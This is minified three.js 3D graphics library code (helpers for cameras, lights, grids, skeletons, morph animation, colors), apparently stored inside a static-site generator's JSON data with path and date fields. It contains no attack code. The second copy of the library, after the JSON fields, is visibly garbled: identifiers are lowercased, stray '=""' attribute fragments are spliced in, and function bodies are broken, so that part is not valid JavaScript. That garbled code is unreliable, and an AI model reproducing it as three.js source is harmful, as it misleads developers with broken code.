THREE.LineBasicMaterial({color:16777215,vertexColors:THREE.FaceColors}),f={};b(\"n1\",\"n2\",16755200);b(\"n2\",\"n4\",16755200);b(\"n4\",\"n3\",16755200);b(\"n3\",\"n1\",16755200);b(\"f1\",\"f2\",16755200);b(\"f2\",\"f4\",16755200);b(\"f4\",\"f3\",16755200);b(\"f3\",\"f1\",16755200);b(\"n1\",\"f1\",16755200);\nb(\"n2\",\"f2\",16755200);b(\"n3\",\"f3\",16755200);b(\"n4\",\"f4\",16755200);b(\"p\",\"n1\",16711680);b(\"p\",\"n2\",16711680);b(\"p\",\"n3\",16711680);b(\"p\",\"n4\",16711680);b(\"u1\",\"u2\",43775);b(\"u2\",\"u3\",43775);b(\"u3\",\"u1\",43775);b(\"c\",\"t\",16777215);b(\"p\",\"c\",3355443);b(\"cn1\",\"cn2\",3355443);b(\"cn3\",\"cn4\",3355443);b(\"cf1\",\"cf2\",3355443);b(\"cf3\",\"cf4\",3355443);THREE.LineSegments.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=\n!1;this.pointMap=f;this.update()};THREE.CameraHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.CameraHelper.prototype.constructor=THREE.CameraHelper;\nTHREE.CameraHelper.prototype.update=function(){function a(a,g,h,k){d.set(g,h,k).unproject(e);a=c[a];if(void 0!==a)for(g=0,h=a.length;g<h;g++)b.vertices[a[g]].copy(d)}var b,c,d=new THREE.Vector3,e=new THREE.Camera;return function(){b=this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\"c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,\n-1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.verticesNeedUpdate=!0}}();\nTHREE.DirectionalLightHelper=function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void 0===b&&(b=1);var c=new THREE.BufferGeometry;c.addAttribute(\"position\",new THREE.Float32Attribute([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var d=new THREE.LineBasicMaterial({fog:!1});this.add(new THREE.Line(c,d));c=new THREE.BufferGeometry;c.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,0,1],3));this.add(new THREE.Line(c,\nd));this.update()};THREE.DirectionalLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.DirectionalLightHelper.prototype.constructor=THREE.DirectionalLightHelper;THREE.DirectionalLightHelper.prototype.dispose=function(){var a=this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};\nTHREE.DirectionalLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Vector3;return function(){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);c.subVectors(b,a);var d=this.children[0],e=this.children[1];d.lookAt(c);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);e.lookAt(c);e.scale.z=c.length()}}();\nTHREE.EdgesHelper=function(a,b,c){b=void 0!==b?b:16777215;THREE.LineSegments.call(this,new THREE.EdgesGeometry(a.geometry,c),new THREE.LineBasicMaterial({color:b}));this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1};THREE.EdgesHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.EdgesHelper.prototype.constructor=THREE.EdgesHelper;\nTHREE.FaceNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16776960;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=c.faces.length:console.warn(\"THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead.\");c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=\n!1;this.update()};THREE.FaceNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.FaceNormalsHelper.prototype.constructor=THREE.FaceNormalsHelper;\nTHREE.FaceNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);for(var d=this.object.matrixWorld,e=this.geometry.attributes.position,f=this.object.geometry,g=f.vertices,f=f.faces,h=0,k=0,l=f.length;k<l;k++){var n=f[k],p=n.normal;a.copy(g[n.a]).add(g[n.b]).add(g[n.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);\ne.setXYZ(h,a.x,a.y,a.z);h+=1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return this}}();\nTHREE.GridHelper=function(a,b,c,d){c=new THREE.Color(void 0!==c?c:4473924);d=new THREE.Color(void 0!==d?d:8947848);for(var e=[],f=[],g=-a,h=0;g<=a;g+=b){e.push(-a,0,g,a,0,g);e.push(g,0,-a,g,0,a);var k=0===g?c:d;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3}a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute(e,3));a.addAttribute(\"color\",new THREE.Float32Attribute(f,3));e=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,\na,e)};THREE.GridHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.GridHelper.prototype.constructor=THREE.GridHelper;THREE.GridHelper.prototype.setColors=function(){console.error(\"THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.\")};\nTHREE.HemisphereLightHelper=function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.colors=[new THREE.Color,new THREE.Color];var c=new THREE.SphereGeometry(b,4,2);c.rotateX(-Math.PI/2);for(var d=0;8>d;d++)c.faces[d].color=this.colors[4>d?0:1];d=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,wireframe:!0});this.lightSphere=new THREE.Mesh(c,d);this.add(this.lightSphere);this.update()};\nTHREE.HemisphereLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.HemisphereLightHelper.prototype.constructor=THREE.HemisphereLightHelper;THREE.HemisphereLightHelper.prototype.dispose=function(){this.lightSphere.geometry.dispose();this.lightSphere.material.dispose()};\nTHREE.HemisphereLightHelper.prototype.update=function(){var a=new THREE.Vector3;return function(){this.colors[0].copy(this.light.color).multiplyScalar(this.light.intensity);this.colors[1].copy(this.light.groundColor).multiplyScalar(this.light.intensity);this.lightSphere.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());this.lightSphere.geometry.colorsNeedUpdate=!0}}();\nTHREE.PointLightHelper=function(a,b){this.light=a;this.light.updateMatrixWorld();var c=new THREE.SphereBufferGeometry(b,4,2),d=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);THREE.Mesh.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1};THREE.PointLightHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.PointLightHelper.prototype.constructor=THREE.PointLightHelper;\nTHREE.PointLightHelper.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};THREE.PointLightHelper.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};\nTHREE.SkeletonHelper=function(a){this.bones=this.getBoneList(a);for(var b=new THREE.Geometry,c=0;c<this.bones.length;c++)this.bones[c].parent instanceof THREE.Bone&&(b.vertices.push(new THREE.Vector3),b.vertices.push(new THREE.Vector3),b.colors.push(new THREE.Color(0,0,1)),b.colors.push(new THREE.Color(0,1,0)));b.dynamic=!0;c=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors,depthTest:!1,depthWrite:!1,transparent:!0});THREE.LineSegments.call(this,b,c);this.root=a;this.matrix=a.matrixWorld;\nthis.matrixAutoUpdate=!1;this.update()};THREE.SkeletonHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.SkeletonHelper.prototype.constructor=THREE.SkeletonHelper;THREE.SkeletonHelper.prototype.getBoneList=function(a){var b=[];a instanceof THREE.Bone&&b.push(a);for(var c=0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));return b};\nTHREE.SkeletonHelper.prototype.update=function(){for(var a=this.geometry,b=(new THREE.Matrix4).getInverse(this.root.matrixWorld),c=new THREE.Matrix4,d=0,e=0;e<this.bones.length;e++){var f=this.bones[e];f.parent instanceof THREE.Bone&&(c.multiplyMatrices(b,f.matrixWorld),a.vertices[d].setFromMatrixPosition(c),c.multiplyMatrices(b,f.parent.matrixWorld),a.vertices[d+1].setFromMatrixPosition(c),d+=2)}a.verticesNeedUpdate=!0;a.computeBoundingSphere()};\nTHREE.SpotLightHelper=function(a){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new THREE.BufferGeometry;for(var b=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],c=0,d=1;32>c;c++,d++){var e=c/32*Math.PI*2,f=d/32*Math.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new THREE.Float32Attribute(b,3));b=new THREE.LineBasicMaterial({fog:!1});this.cone=new THREE.LineSegments(a,\nb);this.add(this.cone);this.update()};THREE.SpotLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.SpotLightHelper.prototype.constructor=THREE.SpotLightHelper;THREE.SpotLightHelper.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};\nTHREE.SpotLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){var c=this.light.distance?this.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();\nTHREE.VertexNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=3*c.faces.length:c instanceof THREE.BufferGeometry&&(b=c.attributes.normal.count);c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()};\nTHREE.VertexNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.VertexNormalsHelper.prototype.constructor=THREE.VertexNormalsHelper;\nTHREE.VertexNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);var e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g instanceof THREE.Geometry)for(var h=g.vertices,k=g.faces,l=g=0,n=k.length;l<n;l++)for(var p=k[l],m=0,q=p.vertexNormals.length;m<q;m++){var r=p.vertexNormals[m];a.copy(h[p[d[m]]]).applyMatrix4(e);\nb.copy(r).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);f.setXYZ(g,a.x,a.y,a.z);g+=1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else if(g instanceof THREE.BufferGeometry)for(d=g.attributes.position,h=g.attributes.normal,m=g=0,q=d.count;m<q;m++)a.set(d.getX(m),d.getY(m),d.getZ(m)).applyMatrix4(e),b.set(h.getX(m),h.getY(m),h.getZ(m)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return this}}();\nTHREE.WireframeHelper=function(a,b){var c=void 0!==b?b:16777215;THREE.LineSegments.call(this,new THREE.WireframeGeometry(a.geometry),new THREE.LineBasicMaterial({color:c}));this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1};THREE.WireframeHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.WireframeHelper.prototype.constructor=THREE.WireframeHelper;THREE.ImmediateRenderObject=function(a){THREE.Object3D.call(this);this.material=a;this.render=function(a){}};\nTHREE.ImmediateRenderObject.prototype=Object.create(THREE.Object3D.prototype);THREE.ImmediateRenderObject.prototype.constructor=THREE.ImmediateRenderObject;THREE.MorphBlendMesh=function(a,b){THREE.Mesh.call(this,a,b);this.animationsMap={};this.animationsList=[];var c=this.geometry.morphTargets.length;this.createAnimation(\"__default\",0,c-1,c/1);this.setAnimationWeight(\"__default\",1)};THREE.MorphBlendMesh.prototype=Object.create(THREE.Mesh.prototype);THREE.MorphBlendMesh.prototype.constructor=THREE.MorphBlendMesh;\nTHREE.MorphBlendMesh.prototype.createAnimation=function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};\nTHREE.MorphBlendMesh.prototype.autoCreateAnimations=function(a){for(var b=/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<g;f++){var h=e.morphTargets[f].name.match(b);if(h&&1<h.length){var k=h[1];d[k]||(d[k]={start:Infinity,end:-Infinity});h=d[k];f<h.start&&(h.start=f);f>h.end&&(h.end=f);c||(c=k)}}for(k in d)h=d[k],this.createAnimation(k,h.start,h.end,a);this.firstAnimation=c};\nTHREE.MorphBlendMesh.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};THREE.MorphBlendMesh.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};THREE.MorphBlendMesh.prototype.setAnimationFPS=function(a,b){var c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};\nTHREE.MorphBlendMesh.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};THREE.MorphBlendMesh.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};THREE.MorphBlendMesh.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};THREE.MorphBlendMesh.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};\nTHREE.MorphBlendMesh.prototype.getAnimationDuration=function(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};THREE.MorphBlendMesh.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};THREE.MorphBlendMesh.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};\nTHREE.MorphBlendMesh.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=this.animationsList[b];if(d.active){var e=d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time>d.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+THREE.Math.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&\n(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==d.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};\n","date":"2017-07-06T07:53:26.262Z","updated":"2017-07-06T07:28:52.998Z","path":"libs/webGL/a10/three.min.js","layout":"false","title":"","comments":1,"_id":"cje9esjym002vi4uco4q0slvg","content":"// threejs.org/license\n'use strict';var THREE={REVISION:\"78\"};\"function\"===typeof define&&define.amd?define(\"three\",THREE):\"undefined\"!==typeof exports&&\"undefined\"!==typeof module&&(module.exports=THREE);void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0=\"==Function.prototype.name&&Object.defineProperty(Function.prototype,\" name\",{get:function(){return\"=\"\" this.tostring().match(=\"\" ^\\s*function\\s*(\\s*)\\s*\\(=\"\" )[1]}});=\"\" void=\"\" new=\"\" typeerror(\"cannot=\"\" convert=\"\" undefined=\"\" or=\"\" null=\"\" to=\"\" object\");for(var=\"\" b=\"Object(a),c=1;c<arguments.length;c++){var\" d=\"arguments[c];if(void\" 0!=\"=d&&null!==d)for(var\" e=\"\" in=\"\" d)object.prototype.hasownproperty.call(d,e)&&(b[e]=\"d[e])}return\" b}}();=\"\" object.assign(three,{mouse:{left:0,middle:1,right:2},cullfacenone:0,cullfaceback:1,cullfacefront:2,cullfacefrontback:3,frontfacedirectioncw:0,frontfacedirectionccw:1,basicshadowmap:0,pcfshadowmap:1,pcfsoftshadowmap:2,frontside:0,backside:1,doubleside:2,flatshading:1,smoothshading:2,nocolors:0,facecolors:1,vertexcolors:2,noblending:0,normalblending:1,additiveblending:2,subtractiveblending:3,multiplyblending:4,customblending:5,addequation:100,subtractequation:101,reversesubtractequation:102,minequation:103,=\"\" maxequation:104,zerofactor:200,onefactor:201,srccolorfactor:202,oneminussrccolorfactor:203,srcalphafactor:204,oneminussrcalphafactor:205,dstalphafactor:206,oneminusdstalphafactor:207,dstcolorfactor:208,oneminusdstcolorfactor:209,srcalphasaturatefactor:210,neverdepth:0,alwaysdepth:1,lessdepth:2,lessequaldepth:3,equaldepth:4,greaterequaldepth:5,greaterdepth:6,notequaldepth:7,multiplyoperation:0,mixoperation:1,addoperation:2,notonemapping:0,lineartonemapping:1,reinhardtonemapping:2,uncharted2tonemapping:3,=\"\" cineontonemapping:4,uvmapping:300,cubereflectionmapping:301,cuberefractionmapping:302,equirectangularreflectionmapping:303,equirectangularrefractionmapping:304,sphericalreflectionmapping:305,cubeuvreflectionmapping:306,cubeuvrefractionmapping:307,repeatwrapping:1e3,clamptoedgewrapping:1001,mirroredrepeatwrapping:1002,nearestfilter:1003,nearestmipmapnearestfilter:1004,nearestmipmaplinearfilter:1005,linearfilter:1006,linearmipmapnearestfilter:1007,linearmipmaplinearfilter:1008,unsignedbytetype:1009,=\"\" bytetype:1010,shorttype:1011,unsignedshorttype:1012,inttype:1013,unsignedinttype:1014,floattype:1015,halffloattype:1025,unsignedshort4444type:1016,unsignedshort5551type:1017,unsignedshort565type:1018,alphaformat:1019,rgbformat:1020,rgbaformat:1021,luminanceformat:1022,luminancealphaformat:1023,rgbeformat:three.rgbaformat,depthformat:1026,rgb_s3tc_dxt1_format:2001,rgba_s3tc_dxt1_format:2002,rgba_s3tc_dxt3_format:2003,rgba_s3tc_dxt5_format:2004,rgb_pvrtc_4bppv1_format:2100,rgb_pvrtc_2bppv1_format:2101,=\"\" rgba_pvrtc_4bppv1_format:2102,rgba_pvrtc_2bppv1_format:2103,rgb_etc1_format:2151,looponce:2200,looprepeat:2201,looppingpong:2202,interpolatediscrete:2300,interpolatelinear:2301,interpolatesmooth:2302,zerocurvatureending:2400,zeroslopeending:2401,wraparoundending:2402,trianglesdrawmode:0,trianglestripdrawmode:1,trianglefandrawmode:2,linearencoding:3e3,srgbencoding:3001,gammaencoding:3007,rgbeencoding:3002,logluvencoding:3003,rgbm7encoding:3004,rgbm16encoding:3005,rgbdencoding:3006,basicdepthpacking:3200,=\"\" rgbadepthpacking:3201});three.color=\"function(a,b,c){return\" three.color.prototype=\"{constructor:THREE.Color,r:1,g:1,b:1,set:function(a){a\" instanceof=\"\" three.color?this.copy(a):\"number\"=\"==typeof\" a?this.sethex(a):\"string\"=\"==typeof\" a&&this.setstyle(a);return=\"\" this},setscalar:function(a){this.b=\"this.g=this.r=a},setHex:function(a){a=Math.floor(a);this.r=(a\">>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&(d-=1);return d<1=\"\" 6?a+6*(c-a)*=\"\" d:.5=\"\">d?c:d<2 3?a+6*(c-a)*(2=\"\" 3-d):a}return=\"\" function(b,c,d){b=\"THREE.Math.euclideanModulo(b,1);c=THREE.Math.clamp(c,0,1);d=THREE.Math.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5\">=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=\n/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=\nparseFloat(c[1])/360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&& 0=\"==b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return\" (c=\"THREE.ColorKeywords[a],void\" 0!=\"=c?this.setHex(c):console.warn(\" three.color:\"=\"\" unknown=\"\" color=\"\" \"+a));return=\"\" this},clone:function(){return=\"\" new=\"\" this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=\"a.r;this.g=a.g;this.b=a.b;return\" this},copygammatolinear:function(a,b){void=\"\" this},copylineartogamma:function(a,b){void=\"\" c=\"0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,\" c);return=\"\" this},convertgammatolinear:function(){var=\"\" a=\"this.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return\" this},convertlineartogamma:function(){this.r=\"Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return\" this},gethex:function(){return=\"\" 255*this.r<<16^255*this.g<<8^255*this.b<<0},gethexstring:function(){return(\"000000\"+this.gethex().tostring(16)).slice(-6)},gethsl:function(a){a=\"a||{h:0,s:0,l:0};var\" b=\"this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=\" (f+e)=\"\" 2;if(f=\"==e)f=g=0;else{var\" k=\"e-f,f=.5\">=h?k/(e+f):k/(2-e-f);switch(e){case b:g=(c-d)/k+(c<d?6:0);break;case 0=\"==b&&(b=0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return\" c:g=\"(d-b)/k+2;break;case\" d:g=\"(b-c)/k+4}g/=6}a.h=g;a.s=f;a.l=h;return\" a},getstyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsethsl:function(a,b,c){var=\"\" d=\"this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return\" this},add:function(a){this.r+=\"a.r;this.g+=a.g;this.b+=a.b;return\" this},addcolors:function(a,b){this.r=\"a.r+b.r;this.g=a.g+b.g;this.b=\" a.b+b.b;return=\"\" this},addscalar:function(a){this.r+=\"a;this.g+=a;this.b+=a;return\" this},multiply:function(a){this.r*=\"a.r;this.g*=a.g;this.b*=a.b;return\" this},multiplyscalar:function(a){this.r*=\"a;this.g*=a;this.b*=a;return\" this},lerp:function(a,b){this.r+=\"(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return\" this},equals:function(a){return=\"\" a.r=\"==this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void\" this},toarray:function(a,=\"\" b){void=\"\" a}};=\"\" three.colorkeywords=\"{aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,\" darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,=\"\" grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,=\"\" lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,=\"\" palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,=\"\" tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};three.quaternion=\"function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void\" 0!=\"=d?d:1};\" three.quaternion.prototype=\"{constructor:THREE.Quaternion,get\" x(){return=\"\" this._x},set=\"\" x(a){this._x=\"a;this.onChangeCallback()},get\" y(){return=\"\" this._y},set=\"\" y(a){this._y=\"a;this.onChangeCallback()},get\" z(){return=\"\" this._z},set=\"\" 